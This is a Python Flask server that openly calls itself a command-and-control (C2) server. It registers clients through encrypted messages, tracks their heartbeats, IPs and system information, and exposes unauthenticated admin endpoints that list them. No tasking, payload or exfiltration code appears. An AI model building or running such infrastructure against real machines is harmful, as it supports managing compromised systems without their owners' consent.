from flask import Flask, request, jsonify
import time
import threading
from datetime import datetime
import os
from config import ENCRYPTION_KEY
from encryptor import Encryptor
from protocol import Protocol


app = Flask(__name__)

#In-memory storage for clients
clients = {}

encryptor = Encryptor(ENCRYPTION_KEY)




def cleanup_old_clients():
    while True:
        current_time = time.time()
        clients_to_remove = []
        
        for client_id, client_data in clients.items():
            if current_time - client_data.get('last_seen', 0) > 3600:  #1 hour
                clients_to_remove.append(client_id)
        
        for client_id in clients_to_remove:
            del clients[client_id]
            print(f"Removed inactive client: {client_id}")
        
        time.sleep(30)  # Check every 30 seconds

#Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_old_clients, daemon=True)
cleanup_thread.start()


@app.route('/')
def home():
    return "C2 Server Online - " + datetime.now().isoformat()


@app.route('/register', methods=['POST'])
def register_client():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            error_msg = Protocol.create_error_message("No encrypted data provided!")

            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        client_data = encryptor.decrypt(encrypted_data)
        if not client_data:
            error_msg = Protocol.create_error_message("Decryption failed")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        if client_data.get("type") != Protocol.MSG_REGISTER:
            error_msg = Protocol.create_error_message("Invalid message type for registration")

            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        client_id = client_data.get("client_id")
        system_info = client_data.get("system_info", {})

        if not client_id:
            error_msg = Protocol.create_error_message("No client id in message")
            encrypted_res = encryptor.encrypt(error_msg)
            
            return jsonify({
                "data": encrypted_res
            }), 400
        

        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        clients[client_id] = {
            'system_info': system_info,
            'last_seen': time.time(),
            'first_seen': time.time(),
            'ip': client_ip,
            'checkin_count': clients.get(client_id, {}).get('checkin_count', 0) + 1
        }



        response_data = Protocol.create_success_message("Registred successfully!!!")
        encrypted_response = encryptor.encrypt(response_data)

        return jsonify({"data": encrypted_response})
    

    except Exception as e:
        print(f"REGISTRATION ERROR: {e}")
        error_msg = Protocol.create_error_message(str(e))
        error_res = encryptor.encrypt(error_msg)

        return jsonify({
            "data": error_res
        }), 500


@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            error_msg = Protocol.create_error_message("No encrypted data")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400



        heartbeat_data = encryptor.decrypt(encrypted_data)
        if not heartbeat_data:
            error_msg = Protocol.create_error_message("Decryption faild!")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400

        if heartbeat_data.get("type") != Protocol.MSG_HEARTBEAT:
            error_msg = Protocol.create_error_message("Invalid message type for heartbeat")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400



        client_id = heartbeat_data.get('client_id')

        if client_id and client_id in clients:
            clients[client_id]['last_seen'] = time.time()
            clients[client_id]['checkin_count'] = clients[client_id].get('checkin_count', 0) + 1 
            


            res_msg = Protocol.create_success_message()
            encrypted_response = encryptor.encrypt(res_msg)
            return jsonify({
                "data": encrypted_response
            })


        else:
            error_msg = Protocol.create_error_message("Client not found!")
            encrypted_response = encryptor.encrypt(error_msg)

            return jsonify({
                "data": encrypted_response,
            }), 404
    
    except Exception as e:
        error_msg = Protocol.create_error_message(str(e))
        encrypted_res = encryptor.encrypt(error_msg)

        return jsonify({
            "data": encrypted_res
        }), 500


@app.route('/admin/clients', methods=['GET'])
def get_clients():
    #Get list of all connected clients
    clients_list = []
    current_time = time.time()
    
    for client_id, client_data in clients.items():
        last_seen = client_data.get('last_seen', 0)
        clients_list.append({
            "client_id": client_id,
            "system_info": client_data.get('system_info', {}),
            "first_seen": client_data.get('first_seen'),
            "last_seen": last_seen,
            "ip": client_data.get('ip'),
            "online": current_time - last_seen < 10,  #online if seen in last 10 seconds
            "checkin_count": client_data.get('checkin_count', 0),
            "uptime_seconds": current_time - client_data.get('first_seen', current_time)
        })
    
    print(f"[ADMIN] Returning {len(clients_list)} clients")
    return jsonify({
        "status": "success",
        "clients": clients_list,
        "total_clients": len(clients_list),
        "server_time": datetime.now().isoformat()
    })


@app.route('/admin/status', methods=['GET'])
def server_status():
    online_clients = sum(1 for client in clients.values() 
                        if time.time() - client.get('last_seen', 0) < 10)
    
    return jsonify({
        "status": "online",
        "total_clients": len(clients),
        "online_clients": online_clients,
        "server_time": datetime.now().isoformat(),
        "uptime_seconds": time.time() - app.start_time
    })



#Store server start time
app.start_time = time.time()



if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"[SERVER] Starting C2 server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)